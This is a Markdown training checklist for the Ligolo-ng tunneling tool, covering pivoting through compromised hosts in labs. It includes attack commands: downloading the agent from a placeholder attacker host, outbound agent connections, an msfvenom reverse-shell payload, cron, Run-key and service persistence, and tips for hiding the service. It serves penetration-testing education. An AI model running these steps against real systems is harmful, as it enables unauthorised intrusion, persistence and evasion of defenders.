# 🌉 Ligolo-ng: Complete Mastery Checklist

> **What is Ligolo-ng?** Ligolo-ng is a modern, lightweight tunneling/pivoting tool that creates a TUN interface on the attacker's machine and routes traffic through a compromised host to otherwise unreachable internal networks — without needing SOCKS proxies or ProxyChains. It uses a reverse connection model: the compromised host (agent) connects outbound to the attacker's relay server. From the attacker's machine, the internal network becomes directly routable as if locally connected.
>
> **Why does it exist?** Classic pivoting via SSH port forwarding or SOCKS proxies is cumbersome and slow, and tools like ProxyChains don't work with UDP or raw sockets. Ligolo-ng creates a real TUN/TAP tunnel interface — native routing — so every tool (Nmap, Metasploit, evil-winrm, Burp, everything) works on the internal network as if the attacker is directly on it.
>
> **When to use it:** After compromising a dual-homed machine that has access to an internal network segment you cannot reach directly. Multi-hop pivoting through multiple layers. Any scenario where you need to reach a network behind a compromised host.
>
> **What mastering Ligolo-ng unlocks:** Full network pivoting capability. The ability to attack internal networks through a beachhead. The core skill that separates basic pentesting from advanced red team operations.
>
> **Roadmap Phase:** Phase 5 (Pivoting and Tunneling)

---

## 🧭 Navigation

> [🏠 Home](../README.md) · [📋 Roadmap](../Roadmap/README.md)

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Fundamentals | 4 | 1–2 hours |
| 2 | Setup | 5 | 2–3 hours |
| 3 | Basic Pivoting | 4 | 2–3 hours |
| 4 | Advanced | 4 | 3–4 hours |
| 5 | Multi-hop | 3 | 2–3 hours |
| 6 | Integration | 3 | 1–2 hours |
| 7 | Practical Labs | 4 | 4–6 hours |
| 8 | Mastery Challenges | 3 | 3–5 hours |
| | **Total** | **30** | **~18–28 hours** |

**Prerequisites:** TCP/IP routing concepts (subnets, gateways, routing tables). Understanding of what pivoting is and why it's needed. Linux TUN/TAP interface basics.

---

# PHASE 1: FUNDAMENTALS

---

### Task 1.1 — Why Pivoting is Needed

- [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Scenario** | Attacker can reach `192.168.1.0/24`. Compromised machine on `192.168.1.50` also has a NIC on `10.10.0.0/24` — the internal network. Attacker cannot reach `10.10.0.0/24` directly. |
| **Pivot** | Use the compromised machine as a jump point. Traffic from attacker → tunneled through compromised machine → exits into `10.10.0.0/24`. |
| **Goal** | Treat `10.10.0.0/24` as directly reachable from the attacker's machine. |

---

### Task 1.2 — Ligolo-ng Architecture

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Proxy** | Runs on the attacker's machine. Creates a TUN interface. Listens for incoming agent connections. |
| **Agent** | Runs on the compromised machine. Connects outbound to the proxy. Routes traffic between the proxy's TUN interface and the internal network. |
| **TUN Interface** | Virtual network interface (`ligolo`) created on the attacker's machine. Traffic routed to this interface → tunneled through the agent → reaches the internal network. |
| **vs. SOCKS** | SOCKS: ProxyChains wraps each connection. UDP not supported. Slow. TUN interface: native routing. All protocols. Fast. Every tool works natively. |

---

### Task 1.3 — Ligolo-ng vs. Chisel vs. SSH Tunneling

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **SSH -D** | SOCKS proxy via SSH. Simple but requires SSH access. ProxyChains needed. No UDP. |
| **Chisel** | SOCKS5 or port forwarding via HTTP tunnel. Good for web-based pivoting. ProxyChains needed. |
| **Ligolo-ng** | TUN interface — native routing. All protocols. No ProxyChains. Fastest and most transparent. Best choice for complex pivoting scenarios. |

---

### Task 1.4 — Downloads

- [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **GitHub** | `github.com/nicocha30/ligolo-ng/releases`. |
| **Files** | `proxy` — runs on attacker (Linux). `agent` — runs on target (Linux or Windows: `agent.exe`). |
| **Self-contained** | Both are single static binaries. No dependencies. Transfer agent to compromised host. |

---

# PHASE 2: SETUP

---

### Task 2.1 — Attacker Setup: TUN Interface

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Create Interface** | `sudo ip tuntap add user $(whoami) mode tun ligolo`. |
| **Bring Up** | `sudo ip link set ligolo up`. |
| **Verify** | `ip a show ligolo` — should show the interface up. |
| **One-time Setup** | Only need to create the interface once per session. It persists until reboot. |

---

### Task 2.2 — Start Proxy (Attacker)

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Command** | `./proxy -selfcert -laddr 0.0.0.0:11601`. |
| **Flags** | `-selfcert` — auto-generate TLS cert (no need for real cert in labs). `-laddr 0.0.0.0:11601` — listen on all interfaces, port 11601. |
| **Custom Cert** | `-certfile cert.pem -keyfile key.pem` — for use in engagements with proper certs. |
| **Interface** | Proxy opens an interactive management shell. Commands: `session`, `start`, `tunnel_add`, `listener_add`. |

---

### Task 2.3 — Transfer and Run Agent (Target)

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Transfer** | `python3 -m http.server 8080` on attacker. `wget http://attacker_ip:8080/agent -O /tmp/agent && chmod +x /tmp/agent` on target. Or: `certutil -urlcache -split -f http://attacker_ip:8080/agent.exe agent.exe` (Windows). |
| **Run (Linux)** | `./agent -connect attacker_ip:11601 -ignore-cert` (lab, self-cert). |
| **Run (Windows)** | `agent.exe -connect attacker_ip:11601 -ignore-cert`. |
| **Result** | In proxy shell: `[INFO] Agent joined: hostname (ip)` → new session available. |

---

### Task 2.4 — Start the Tunnel

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Select Session** | In proxy shell: `session` → shows connected agents → select number. |
| **Start Tunnel** | `start` — starts the tunnel on the TUN interface. |
| **Add Route** | `sudo ip route add 10.10.0.0/24 dev ligolo` — route the internal network through the TUN interface. |
| **Verify** | `ping 10.10.0.1` — if the internal network's gateway responds, tunneling is working. |

---

### Task 2.5 — Teardown

- [ ] **Completed** · ⭐ Beginner · ⏱️ 5 min

| Field | Detail |
|:---|:---|
| **Remove Route** | `sudo ip route del 10.10.0.0/24 dev ligolo`. |
| **Stop Session** | In proxy shell: Ctrl+C or `stop`. |
| **Remove Interface** | `sudo ip link del ligolo` — if needed (or just leave for the session). |

---

# PHASE 3: BASIC PIVOTING

---

### Task 3.1 — Scanning the Internal Network

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Direct Nmap** | `nmap -sV 10.10.0.0/24` — runs directly on attacker, reaches internal network via ligolo TUN. No ProxyChains needed. |
| **Speed** | As fast as native network scanning — ligolo-ng is fast. |

---

### Task 3.2 — Accessing Internal Services

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Web** | `curl http://10.10.0.100` or open browser → `http://10.10.0.100`. Works natively. |
| **SMB** | `nxc smb 10.10.0.0/24 -u admin -p pass` — direct, no proxy. |
| **WinRM** | `evil-winrm -i 10.10.0.100 -u admin -p pass`. |
| **RDP** | `xfreerdp /v:10.10.0.100` — native RDP to internal host. |

---

### Task 3.3 — Running Metasploit Against Internal

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Setup** | With ligolo route in place, internal IPs are directly routable. |
| **Metasploit** | Just point to the internal IP: `set RHOSTS 10.10.0.100`. No additional proxy config needed. |
| **Listener** | For reverse shells from internal hosts back to attacker: use a listener add. |

---

### Task 3.4 — Reverse Shells from Internal Hosts

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Problem** | Internal host needs to connect back to attacker. Internal host can't reach the attacker's IP directly (different network). |
| **Solution** | `listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444` — in proxy shell. Agent listens on port 4444 on the compromised host. Forwards to attacker's 127.0.0.1:4444. |
| **Payload** | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<compromised_host_ip> LPORT=4444 -f exe > shell.exe`. Internal host → connects to compromised host:4444 → forwarded to attacker's listener. |

---

# PHASE 4: ADVANCED

---

### Task 4.1 — Listener Add (Port Forwarding)

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Command** | In proxy shell: `listener_add --addr 0.0.0.0:LPORT --to 127.0.0.1:LPORT`. |
| **Effect** | Agent machine listens on `LPORT`. Connections forwarded through tunnel to attacker's `127.0.0.1:LPORT`. Allows internal hosts (which can see the compromised host but not the attacker) to reach attacker's services. |

---

### Task 4.2 — Multiple Interfaces on Agent

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Scenario** | Compromised host has 3 NICs: `192.168.1.50`, `10.10.0.5`, `172.16.5.100`. All three networks accessible via the tunnel. |
| **Add Routes** | `sudo ip route add 10.10.0.0/24 dev ligolo`. `sudo ip route add 172.16.5.0/24 dev ligolo`. Both networks now reachable. |

---

### Task 4.3 — Persistent Agent

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Linux Persistence** | Add to crontab: `@reboot /tmp/agent -connect attacker_ip:11601 -ignore-cert`. |
| **Windows** | Register as scheduled task or service. Or add to `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`. |
| **Risk** | Persistence is noisy — use only when explicitly in scope and authorized. |

---

### Task 4.4 — Agent as Service (Windows)

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Create Service** | `sc create ligolo-agent binPath= "C:\Windows\Temp\agent.exe -connect attacker_ip:11601 -ignore-cert" start= auto`. `sc start ligolo-agent`. |
| **Stealth** | Use a benign service name. Move agent to a less-obvious path. Sign with a code signing cert if available. |

---

# PHASE 5: MULTI-HOP

---

### Task 5.1 — Chaining Pivots

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Scenario** | Attacker → Pivot1 (10.10.0.5) → Pivot2 (172.16.5.10) → internal DC (192.168.100.1). |
| **Approach** | Pivot1 has ligolo agent → tunnel to attacker. Route `10.10.0.0/24` and `172.16.5.0/24` through Pivot1 agent. Reach Pivot2 (172.16.5.10) from attacker. Deploy second ligolo agent on Pivot2. But agent needs to connect to attacker — use listener_add on Pivot1 to forward the connection. |

---

### Task 5.2 — Network Discovery Through Pivots

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Approach** | After establishing first pivot: run Nmap through it to discover dual-homed machines. `nmap -sV -p 80,443,22,3389,445 172.16.5.0/24`. Identify new pivot candidates. Repeat. |

---

### Task 5.3 — Multi-hop Reverse Shells

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 30 min

| Field | Detail |
|:---|:---|
| **Chain** | For each hop: set up a listener_add on the previous pivot's agent → forward connections to the next pivot's agent connect port. Each new compromised machine's agent connects to the previous machine → chains through to attacker. |

---

# PHASE 6: INTEGRATION

---

### Task 6.1 — Ligolo + Burp Suite

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Workflow** | Route internal web server through ligolo. Open Burp. Intercept: `http://10.10.0.100`. No proxy needed for browser — ligolo handles routing. |
| **FoxyProxy** | Point browser at Burp proxy. Route internal traffic through ligolo. Manual testing of internal web apps via Burp. |

---

### Task 6.2 — Ligolo + BloodHound

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Workflow** | `nxc ldap 10.10.0.10 -u user -p pass --bloodhound` — collects via ligolo tunnel. Or: run SharpHound.exe on a compromised host, exfiltrate via listener_add, import into BloodHound. |

---

### Task 6.3 — Ligolo + Metasploit

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Direct** | Set RHOSTS to internal IP. Works natively via ligolo routing. |
| **Handlers** | Set up listener_add for reverse shells. msfconsole handler on attacker machine. `set LHOST 0.0.0.0`. Internal hosts connect to compromised host → forwarded to attacker. |

---

# PHASE 7: PRACTICAL LABS

---

### Lab 7.1 — Basic Pivot Setup

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| **Scenario** | Lab with Kali, a pivot machine (dual-homed), and an internal-only target. Set up ligolo-ng. Route internal network. Confirm access to internal target with ping and Nmap. |
| **Success Criteria** | Internal network routed through ligolo. Internal target reachable from Kali without ProxyChains. |

---

### Lab 7.2 — Full Internal Network Attack

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 60 min

| **Scenario** | Compromise pivot → establish ligolo tunnel → scan internal network → find vulnerable internal service → exploit it → gain second system access. |
| **Success Criteria** | Second internal system compromised via ligolo pivot. |

---

### Lab 7.3 — Reverse Shell via listener_add

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min

| **Scenario** | Internal target needs to connect back to attacker for a reverse shell. Set up listener_add on the compromised host. Generate payload pointing to compromised host. Execute on internal target. Catch reverse shell on Kali. |
| **Success Criteria** | Reverse shell caught from internal target via listener_add chain. |

---

### Lab 7.4 — HTB Pro Labs or TryHackMe Networks

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 90 min

| **Scenario** | HackTheBox Pro Lab or TryHackMe network room requiring pivoting. Use ligolo-ng for all pivoting. Reach all network segments. |
| **Success Criteria** | All segments accessible. Ligolo-ng used exclusively (no ProxyChains). |

---

# PHASE 8: MASTERY CHALLENGES

---

### Challenge 8.1 — Three-Layer Pivot

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 90 min

| **Scenario** | Lab with 3 network segments. Each reachable only through a machine in the previous. Use ligolo-ng chained pivoting to reach segment 3 from Kali. Compromise a machine in segment 3. |
| **Success Criteria** | Segment 3 machine compromised. Three-hop chain documented. |

---

### Challenge 8.2 — Document the Pivot Diagram

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| **Scenario** | After completing a multi-pivot lab: draw the full network topology diagram. Show: attacker IP, each pivot machine, each network segment, each route added to the routing table. Show which ligolo agent connects where. |
| **Success Criteria** | Accurate topology diagram. Could be used in a pentest report. |

---

### Challenge 8.3 — Compare vs. SSH + ProxyChains

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min

| **Scenario** | Perform the same pivot using (a) SSH -D + ProxyChains and (b) Ligolo-ng. Time each approach. Note which tools break with ProxyChains but work with Ligolo-ng. Document the comparison. |
| **Success Criteria** | Both methods tested. Comparison documented. Ligolo advantages clearly stated. |

---

# 📋 FINAL COMPETENCY MATRIX

| Competency | Self-Assessment |
|:---|:---:|
| Can set up the TUN interface and start the proxy | ☐ |
| Can transfer and run the agent on Linux and Windows | ☐ |
| Can start a tunnel and add routing for an internal subnet | ☐ |
| Can run Nmap, nxc, evil-winrm directly on internal IPs via ligolo | ☐ |
| Can use listener_add to catch reverse shells from internal hosts | ☐ |
| Can route multiple subnets through one agent | ☐ |
| Can chain pivots for multi-hop access | ☐ |
| Knows when to use ligolo-ng vs. SSH tunneling vs. Chisel | ☐ |

---

## 🎯 Interview Questions

1. What is the difference between ligolo-ng and a SOCKS proxy for pivoting?
2. How does the TUN interface work in ligolo-ng?
3. How do you route a newly discovered internal subnet through ligolo-ng?
4. What is `listener_add` and when do you need it?
5. How do you catch reverse shells from an internal network through ligolo-ng?
6. What are the advantages of ligolo-ng over SSH port forwarding?
7. How do you chain multiple ligolo-ng pivots for multi-hop access?
8. What command creates and brings up the ligolo TUN interface?
